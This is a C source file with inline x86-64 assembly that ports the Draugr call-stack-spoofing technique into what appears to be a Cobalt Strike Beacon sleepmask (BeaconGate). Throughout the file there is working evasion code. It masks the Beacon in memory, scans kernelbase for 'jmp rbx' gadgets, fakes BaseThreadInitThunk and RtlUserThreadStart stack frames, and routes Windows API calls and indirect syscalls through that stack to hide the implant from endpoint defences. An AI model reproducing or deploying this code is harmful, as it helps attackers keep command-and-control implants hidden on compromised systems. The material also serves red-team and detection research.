#include "..\beacon_gate.h"
#include "..\library\stackspoofing.h"
#include "..\sleepmask.h"
#include "..\sleepmask-vs.h"
#include "..\base\helpers.h"
#include "..\debug.h"

#include <Windows.h>

#define draugrArg(i) (ULONG_PTR)draugrCall->FunctionCall->args[i]

/**
* This is a port to BeaconGate of: https://github.com/NtDallas/Draugr.
* Only very minor changes to the original implementation have been made.
*/

/**
* Execute DraugrGate.
*
* @param draugrCall A pointer to a DRAUGR_FUNCTION_CALL structure.
*/
void DraugrGate(PDRAUGR_FUNCTION_CALL draugrCall) {
    ULONG_PTR retValue = 0;

    // Sanity check incoming ptr.
    if (!draugrCall) {
        return;
    }

    // Call appropriate function pointer based on number of args.
#if ENABLE_LOGGING
    PrintBeaconGateInfo(draugrCall->FunctionCall);
#endif
    if (draugrCall->FunctionCall->numOfArgs == 0) {
        retValue = (ULONG_PTR)((SpoofCallPtr)draugrCall->SpoofCall)((PSYNTHETIC_STACK_FRAME)draugrCall->StackFrame, draugrCall->FunctionCall->functionPtr, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }
    else if (draugrCall->FunctionCall->numOfArgs == 1) {
        retValue = (ULONG_PTR)((SpoofCallPtr)draugrCall->SpoofCall)((PSYNTHETIC_STACK_FRAME)draugrCall->StackFrame, draugrCall->FunctionCall->functionPtr, (PVOID)draugrArg(0), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }
    else if (draugrCall->FunctionCall->numOfArgs == 2) {
        retValue = (ULONG_PTR)((SpoofCallPtr)draugrCall->SpoofCall)((PSYNTHETIC_STACK_FRAME)draugrCall->StackFrame, draugrCall->FunctionCall->functionPtr, (PVOID)draugrArg(0), (PVOID)draugrArg(1), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }
    else if (draugrCall->FunctionCall->numOfArgs == 3) {
        retValue = (ULONG_PTR)((SpoofCallPtr)draugrCall->SpoofCall)((PSYNTHETIC_STACK_FRAME)draugrCall->StackFrame, draugrCall->FunctionCall->functionPtr, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }
    else if (draugrCall->FunctionCall->numOfArgs == 4) {
        retValue = (ULONG_PTR)((SpoofCallPtr)draugrCall->SpoofCall)((PSYNTHETIC_STACK_FRAME)draugrCall->StackFrame, draugrCall->FunctionCall->functionPtr, (PVOID)draugrArg(0),(PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }
    else if (draugrCall->FunctionCall->numOfArgs == 5) {
        retValue = (ULONG_PTR)((SpoofCallPtr)draugrCall->SpoofCall)((PSYNTHETIC_STACK_FRAME)draugrCall->StackFrame, draugrCall->FunctionCall->functionPtr, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    }
    else if (draugrCall->FunctionCall->numOfArgs == 6) {
        retValue = (ULONG_PTR)((SpoofCallPtr)draugrCall->SpoofCall)((PSYNTHETIC_STACK_FRAME)draugrCall->StackFrame, draugrCall->FunctionCall->functionPtr, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), NULL, NULL, NULL, NULL, NULL, NULL);
    }
    else if (draugrCall->FunctionCall->numOfArgs == 7) {
        retValue = (ULONG_PTR)((SpoofCallPtr)draugrCall->SpoofCall)((PSYNTHETIC_STACK_FRAME)draugrCall->StackFrame, draugrCall->FunctionCall->functionPtr, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), (PVOID)draugrArg(6), NULL, NULL, NULL, NULL, NULL);
    }
    else if (draugrCall->FunctionCall->numOfArgs == 8) {
        retValue = (ULONG_PTR)((SpoofCallPtr)draugrCall->SpoofCall)((PSYNTHETIC_STACK_FRAME)draugrCall->StackFrame, draugrCall->FunctionCall->functionPtr, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), (PVOID)draugrArg(6), (PVOID)draugrArg(7), NULL, NULL, NULL, NULL);
    }
    else if (draugrCall->FunctionCall->numOfArgs == 9) {
        retValue = (ULONG_PTR)((SpoofCallPtr)draugrCall->SpoofCall)((PSYNTHETIC_STACK_FRAME)draugrCall->StackFrame, draugrCall->FunctionCall->functionPtr, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), (PVOID)draugrArg(6), (PVOID)draugrArg(7), (PVOID)draugrArg(8), NULL, NULL, NULL);
  }
    else if (draugrCall->FunctionCall->numOfArgs == 10) {
        retValue = (ULONG_PTR)((SpoofCallPtr)draugrCall->SpoofCall)((PSYNTHETIC_STACK_FRAME)draugrCall->StackFrame, draugrCall->FunctionCall->functionPtr, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), (PVOID)draugrArg(6), (PVOID)draugrArg(7), (PVOID)draugrArg(8), (PVOID)draugrArg(9), NULL, NULL);
    }
    else if (draugrCall->FunctionCall->numOfArgs == 11) {
        retValue = (ULONG_PTR)((SpoofCallPtr)draugrCall->SpoofCall)((PSYNTHETIC_STACK_FRAME)draugrCall->StackFrame, draugrCall->FunctionCall->functionPtr, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), (PVOID)draugrArg(6), (PVOID)draugrArg(7), (PVOID)draugrArg(8), (PVOID)draugrArg(9), (PVOID)draugrArg(10), NULL);
    }
    else if (draugrCall->FunctionCall->numOfArgs == 12) {
        retValue = (ULONG_PTR)((SpoofCallPtr)draugrCall->SpoofCall)((PSYNTHETIC_STACK_FRAME)draugrCall->StackFrame, draugrCall->FunctionCall->functionPtr, (PVOID)draugrArg(0), (PVOID)draugrArg(1), (PVOID)draugrArg(2), (PVOID)draugrArg(3), (PVOID)draugrArg(4), (PVOID)draugrArg(5), (PVOID)draugrArg(6), (PVOID)draugrArg(7), (PVOID)draugrArg(8), (PVOID)draugrArg(9), (PVOID)draugrArg(10), (PVOID)draugrArg(11));
    }

    draugrCall->FunctionCall->retValue = retValue;

    return;
}

/**
* A wrapper around DraugrGate to handle masking/unmasking Beacon.
*
* @param info A pointer to a SLEEPMASK_INFO structure.
* @param draugrCall A pointer to a DRAUGR_FUNCTION_CALL structure.
*/
void DraugrGateWrapper(PBEACON_INFO info, PDRAUGR_FUNCTION_CALL draugrCall) {
    if (draugrCall->FunctionCall->bMask == TRUE) {
        MaskBeacon(info);
    }

    if (draugrCall->StackFrame) {
        DLOGF("SLEEPMASK: Calling %s via DraugrGate\n", winApiArray[draugrCall->FunctionCall->function]);
        DraugrGate(draugrCall);
    }
    else {
        // If we failed to create fake call stack, default back to standard BeaconGate.
        DLOGF("SLEEPMASK: Calling %s via BeaconGate\n", winApiArray[draugrCall->FunctionCall->function]);
        BeaconGate(draugrCall->FunctionCall);
    }

    if (draugrCall->FunctionCall->bMask == TRUE) {
        UnMaskBeacon(info);
    }

    return;
}

/**
* Retrieve size of text section.
*
* @param pModule A pointer to target module.
* @param pdwVirtualAddress [out] A pointer to start of target module text section.
* @param pdwSize [out] A pointer to size of target module text section.
* @return A bool indicating success.
*/
BOOL GetTextSectionSize(PVOID pModule, PDWORD pdwVirtualAddress, PDWORD pdwSize) {
    DFR_LOCAL(MSVCRT, strcmp);
    PIMAGE_DOS_HEADER pImgDosHeader = (PIMAGE_DOS_HEADER)(pModule);
    if (pImgDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
      return FALSE;
    }

    PIMAGE_NT_HEADERS pImgNtHeaders = (PIMAGE_NT_HEADERS)((UINT_PTR)pModule + pImgDosHeader->e_lfanew);
    if (pImgNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
      return FALSE;
    }

    PIMAGE_SECTION_HEADER   pImgSectionHeader = IMAGE_FIRST_SECTION(pImgNtHeaders);
    for (int i = 0; i < pImgNtHeaders->FileHeader.NumberOfSections; i++) {
      if (strcmp((char*)pImgSectionHeader[i].Name, (char*)".text") == 0) {
        *pdwVirtualAddress = pImgSectionHeader[i].VirtualAddress;
        *pdwSize = pImgSectionHeader[i].SizeOfRawData;
        return TRUE;
      }
    }

    return FALSE;
}

/**
* Find a gadget to use for call stack spoofing.
*
* Note: This function has been optimized from the original
* to only find gadgets once.
*
* @param pModuleAddr A pointer to target module base address.
* @return A pointer to a valid gadget.
*/
PVOID FindGadget(PVOID  pModuleAddr) {
    static BOOL bFoundGadgets = FALSE;
    DWORD dwTextSectionSize = 0;
    DWORD dwTextSectionVa = 0;
    static PVOID   pGadgetList[maxNumberOfGadgets];
    static DWORD   dwCounter = 0;
    ULONG seed = 0;
    ULONG randomNbr = 0;
    PVOID pModTextSection = NULL;

  #ifdef _DEBUG
    RtlRandomExPtr RtlRandomEx = (RtlRandomExPtr)GetProcAddress(GetModuleHandleA("ntdll"), "RtlRandomEx");
  #endif

    if (!bFoundGadgets){
        if (!GetTextSectionSize(pModuleAddr, &dwTextSectionVa, &dwTextSectionSize)) {
            return NULL;
        }

        pModTextSection = (PBYTE)((UINT_PTR)pModuleAddr + dwTextSectionVa);
        for (int i = 0; i < (dwTextSectionSize - 2); i++) {
            // Searching for jmp rbx gadget
            if (((PBYTE)pModTextSection)[i] == 0xFF && ((PBYTE)pModTextSection)[i + 1] == 0x23) {
                pGadgetList[dwCounter] = (void*)((UINT_PTR)pModTextSection + i);
                dwCounter++;
                if (dwCounter == maxNumberOfGadgets) {
                    break;
                }
            }
        }
        bFoundGadgets = TRUE;
    }

    seed = 0x1337;
    randomNbr = RtlRandomEx(&seed);
    randomNbr %= dwCounter;

    return pGadgetList[randomNbr];
}

/**
* Calculates the stack size for a given function.
*
* @param pRuntimeFunction A pointer to a RUNTIME_FUNCTION structure.
* @param imageBase A dword holding the image base.
* @return A PVOID containing function stack size.
*/
void* CalculateFunctionStackSize(PRUNTIME_FUNCTION pRuntimeFunction, const DWORD64 imageBase) {
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;
    STACK_FRAME stackFrame;
    _memset(&stackFrame, 0, sizeof(stackFrame));

    if (!pRuntimeFunction) {
        goto Cleanup;
    }

    pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + imageBase);
    while (index < pUnwindInfo->CountOfCodes) {
        unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
        operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
        switch (unwindOperation) {
            case UWOP_PUSH_NONVOL:
                stackFrame.TotalStackSize += 8;
                if (RBP_OP_INFO == operationInfo) {
                    stackFrame.PushRbp = TRUE;
                    stackFrame.CountOfCodes = pUnwindInfo->CountOfCodes;
                    stackFrame.PushRbpIndex = index + 1;
                }
                break;
            case UWOP_SAVE_NONVOL:
                index += 1;
                break;
            case UWOP_ALLOC_SMALL:
                stackFrame.TotalStackSize += ((operationInfo * 8) + 8);
                break;
            case UWOP_ALLOC_LARGE:
                index += 1;
                frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
                if (operationInfo == 0) {
                    frameOffset *= 8;
                }
                else {
                    index += 1;
                    frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
                }
                stackFrame.TotalStackSize += frameOffset;
                break;
            case UWOP_SET_FPREG:
                stackFrame.SetsFramePointer = TRUE;
                break;
            case UWOP_SAVE_XMM128:
                // This can cause crashes so ignore.
                goto Cleanup;
            default:
                break;
        }

        index += 1;
    }

    if (0 != (pUnwindInfo->Flags & UNW_FLAG_CHAININFO)) {
        index = pUnwindInfo->CountOfCodes;
        if (0 != (index & 1)) {
            index += 1;
        }
        pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        return CalculateFunctionStackSize(pRuntimeFunction, imageBase);
    }

    stackFrame.TotalStackSize += 8;

    return (void*)stackFrame.TotalStackSize;

Cleanup:
    return NULL;
}

/**
* Wrapper for calculating the stack size for a given function.
*
* @param returnAddress The target return address to calculate the stack size for.
* @return A PVOID containing function stack size.
*/
void* CalculateFunctionStackSizeWrapper(PVOID returnAddress) {
    DFR_LOCAL(KERNEL32, RtlLookupFunctionEntry);
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;

    if (!returnAddress) {
        goto Cleanup;
    }

    pRuntimeFunction = RtlLookupFunctionEntry((DWORD64)returnAddress, &ImageBase, pHistoryTable);
    if (NULL == pRuntimeFunction) {
        goto Cleanup;
    }
    return CalculateFunctionStackSize(pRuntimeFunction, ImageBase);

Cleanup:
    return NULL;
}

/**
* Initialise the fake stack frame.
*
* @param stackFrame A pointer to a SYNTHETIC_STACK_FRAME structure.
* @return A BOOL indicating success.
*/
BOOL InitFrameInfo(PSYNTHETIC_STACK_FRAME stackFrame) {
    void* pModuleFrame1 = GetModuleHandleA("Kernel32.dll");
    void* pModuleFrame2 = GetModuleHandleA("Ntdll.dll");
    void* pModuleGadget = GetModuleHandleA("Kernelbase.dll");

    if (!pModuleFrame1 || !pModuleFrame2 || !pModuleGadget) {
        return FALSE;
    }

    stackFrame->Frame1.ModuleAddress = pModuleFrame1;
    stackFrame->Frame1.FunctionAddress = (PVOID)GetProcAddress((HMODULE)pModuleFrame1, "BaseThreadInitThunk");
    stackFrame->Frame1.Offset = 0x14;

    stackFrame->Frame2.ModuleAddress = pModuleFrame2;
    stackFrame->Frame2.FunctionAddress = (PVOID)GetProcAddress((HMODULE)pModuleFrame2, "RtlUserThreadStart");
    stackFrame->Frame2.Offset = 0x21;

    if (!stackFrame->Frame1.FunctionAddress || !stackFrame->Frame2.FunctionAddress) {
        return FALSE;
    }

    stackFrame->pGadget = pModuleGadget;  // jmp [rbx]
    if (!stackFrame->pGadget) {
        return FALSE;
    }

    return TRUE;
}

/**
* Spoofs the call stack for a target function.
*
* Note: The fake call stack could be cached to avoid re-calculating it for each function call.
*
* @param stackFrame A pointer to a SYNTHETIC_STACK_FRAME structure.
* @param pFunctionAddr A pointer to target function to call.
* @param pArg* The arguments for call (max 10).
* @return A PVOID containing return value.
*/
PVOID SpoofCall(PSYNTHETIC_STACK_FRAME stackFrame, PVOID pFunctionAddr, PVOID pArg1, PVOID pArg2, PVOID pArg3, PVOID pArg4, PVOID pArg5, PVOID pArg6, PVOID pArg7, PVOID pArg8, PVOID pArg9, PVOID pArg10, PVOID pArg11, PVOID pArg12) {
    int attempts = 0;
    void* returnAddress = NULL;
    DRAUGR_PARAMETERS draugrParameters;
    _memset(&draugrParameters, 0, sizeof(draugrParameters));

    // Configure BaseThreadInitThunk frame.
    returnAddress = (void*)((UINT_PTR)stackFrame->Frame1.FunctionAddress + stackFrame->Frame1.Offset);
    draugrParameters.BaseThreadInitThunkStackSize = CalculateFunctionStackSizeWrapper(returnAddress);
    draugrParameters.BaseThreadInitThunkReturnAddress = returnAddress;
    if (!draugrParameters.BaseThreadInitThunkStackSize || !draugrParameters.BaseThreadInitThunkReturnAddress) {
        return NULL;
    }

    // Configure RtlUserThreadStart frame.
    returnAddress = (void*)((UINT_PTR)stackFrame->Frame2.FunctionAddress + stackFrame->Frame2.Offset);
    draugrParameters.RtlUserThreadStartStackSize = CalculateFunctionStackSizeWrapper(returnAddress);
    draugrParameters.RtlUserThreadStartReturnAddress = returnAddress;
    if (!draugrParameters.RtlUserThreadStartStackSize || !draugrParameters.RtlUserThreadStartReturnAddress) {
        return NULL;
    }

    // Configure trampoline frame.
    /**
    * Ensure that the gadget stack size is bigger than 0x80, which is min
    * required to hold 10 arguments, otherwise it will crash sporadically.
    *
    * Note: The better fix is to record how many args are passed and determine
    * if the identified gadget is big enough for the specified function call.
    */

    DLOGF("DRAUGR: Finding suitable draugr trampoline gadget...\n");
    do {
        draugrParameters.Trampoline = FindGadget(stackFrame->pGadget);
        draugrParameters.TrampolineStackSize = CalculateFunctionStackSizeWrapper(draugrParameters.Trampoline);
        // Quick sanity check for infinite loop.
        attempts++;
        if (attempts > maxNumberOfTries) {
            DLOGF("DRAUGR: Failed to find gadget\n");
            return NULL;
        }

    } while (draugrParameters.TrampolineStackSize == NULL || ((__int64)draugrParameters.TrampolineStackSize < 0x80));
    if (!draugrParameters.Trampoline || !draugrParameters.TrampolineStackSize) {
        return NULL;
    }
    DLOGF("DRAUGR: Trampoline: 0x%p\n", draugrParameters.Trampoline);
    DLOGF("DRAUGR: Trampoline func stack size: %d\n", draugrParameters.TrampolineStackSize);
    DLOGF("DRAUGR: Invoking DraugrSpoofStub...\n");

    // Make the call!
    void* retVal = DraugrSpoofStub(pArg1, pArg2, pArg3, pArg4, &draugrParameters, pFunctionAddr, 8, pArg5, pArg6, pArg7, pArg8, pArg9, pArg10, pArg11, pArg12);
    DLOGF("DRAUGR: Return value: 0x%p\n", retVal);

    return retVal;
}

/**
* Asm stub for performing draugr call stack spoofing. 
*
* @param (...) accepts variadic args.
* @return A PVOID containing return value.
*/
__attribute__((naked))
void* DraugrSpoofStub(...) {
  __asm 
  {
      pop rax                             ; Real return address in rax

      mov r10, rdi                        ; Store OG rdi in r10
      mov r11, rsi                        ; Store OG rsi in r11

      mov rdi, [rsp + 32]                 ; Storing struct in rdi
      mov rsi, [rsp + 40]                 ; Storing function to call

      ; -------------------------------------------------------------------- -
      ; Storing our original registers
      ; -------------------------------------------------------------------- -

      mov [rdi + 24], r10                 ; Storing OG rdi into param
      mov [rdi + 88], r11                 ; Storing OG rsi into param
      mov [rdi + 96], r12                 ; Storing OG r12 into param
      mov [rdi + 104], r13                ; Storing OG r13 into param
      mov [rdi + 112], r14                ; Storing OG r14 into param
      mov [rdi + 120], r15                ; Storing OG r15 into param

      mov r12, rax                        ; OG code used r12 for ret addr

      ; -------------------------------------------------------------------- -
      ; Prepping to move stack args
      ; -------------------------------------------------------------------- -

      xor r11, r11                        ; r11 will hold the # of args that have been pushed
      mov r13, [rsp + 0x30]               ; r13 will hold the # of args total that will be pushed

      mov r14, 0x200                      ; r14 will hold the offset we need to push stuff
      add r14, 8
      add r14, [rdi + 56]                 ; stack size of RUTS
      add r14, [rdi + 48]                 ; stack size of BTIT
      add r14, [rdi + 32]                 ; stack size of our gadget frame
      sub r14, 0x20                       ; first stack arg is located at + 0x28 from rsp, so we sub 0x20 from the offset. Loop will sub 0x8 each time.

      mov r10, rsp
      add r10, 0x30                       ; offset of stack arg added to rsp

      looping:

          xor r15, r15                    ; r15 will hold the offset + rsp base
          cmp r11d, r13d                  ; comparing # of stack args added vs # of stack args we need to add
          je finish

          ; -------------------------------------------------------------------- -
          ; Getting location to move the stack arg to
          ; -------------------------------------------------------------------- -

          sub r14, 8                      ; 1 arg means r11 is 0, r14 already 0x28 offset.
          mov r15, rsp                    ; get current stack base
          sub r15, r14                    ; subtract offset

          ; -------------------------------------------------------------------- -
          ; Procuring the stack arg
          ; -------------------------------------------------------------------- -

          add r10, 8

          push qword ptr [r10]
          pop qword ptr [r15]

          ; -------------------------------------------------------------------- -
          ; Increment the counter and loop back in case we need more args
          ; -------------------------------------------------------------------- -
          add r11, 1
          jmp looping

      finish:

          ; ----------------------------------------------------------------------
          ; Creating a large 320 byte frame for our fake call stack
          ; ----------------------------------------------------------------------

          sub rsp, 0x200

          ; ----------------------------------------------------------------------
          ; Pushing a 0 to cut off the return addresses after RtlUserThreadStart
          ; ----------------------------------------------------------------------

          push 0

          ; ----------------------------------------------------------------------
          ; RtlUserThreadStart + 0x14  frame
          ; ----------------------------------------------------------------------

          sub rsp, [rdi + 56]
          mov r11, [rdi + 64]
          mov [rsp], r11

          ; ----------------------------------------------------------------------
          ; BaseThreadInitThunk + 0x21  frame
          ; ----------------------------------------------------------------------

          sub rsp, [rdi + 32]
          mov r11, [rdi + 40]
          mov [rsp], r11

          ; ----------------------------------------------------------------------
          ; Gadget frame
          ; ----------------------------------------------------------------------

          sub rsp, [rdi + 48]
          mov r11, [rdi + 80]
          mov [rsp], r11

          ; ----------------------------------------------------------------------
          ; Adjusting the param struct for the fixup
          ; ----------------------------------------------------------------------

          mov r11, rsi                    ; Copying function to call into r11

          mov [rdi + 8], r12              ; Real return address is now moved into the "OriginalReturnAddress" member
          mov [rdi + 16], rbx             ; original rbx is stored into "Rbx" member
          lea rbx, [rip + fixup]          ; Fixup address is moved into rbx
          mov [rdi], rbx                  ; Fixup member now holds the address of Fixup
          mov rbx, rdi                    ; Address of param struct (Fixup)is moved into rbx

          ; ----------------------------------------------------------------------
          ; For indirect syscall use.If you want to use it, make sure to set ssn
          ; in param struct first.Otherwise, this is ignored by the callee.
          ; ----------------------------------------------------------------------
          mov r10, rcx
          mov rax, [rdi + 72]

          jmp r11

      fixup:
          mov rcx, rbx
          add rsp, 0x200                  ; Remove our large frame
          add rsp, [rbx + 48]             ; Adjust back for our gadget frame
          add rsp, [rbx + 32]             ; Adjust back for our BaseThreadInitThunk frame
          add rsp, [rbx + 56]             ; Adjust back for our RtlUserThreadStart frame

          mov rbx, [rcx + 16]             ; Restoring OG RBX
          mov rdi, [rcx + 24]             ; ReStoring OG rdi
          mov rsi, [rcx + 88]             ; ReStoring OG rsi
          mov r12, [rcx + 96]             ; ReStoring OG r12
          mov r13, [rcx + 104]            ; ReStoring OG r13
          mov r14, [rcx + 112]            ; ReStoring OG r14
          mov r15, [rcx + 120]            ; ReStoring OG r15
          push rax

          xor rax, rax
          pop rax
          jmp qword ptr [rcx + 8]
  }
}

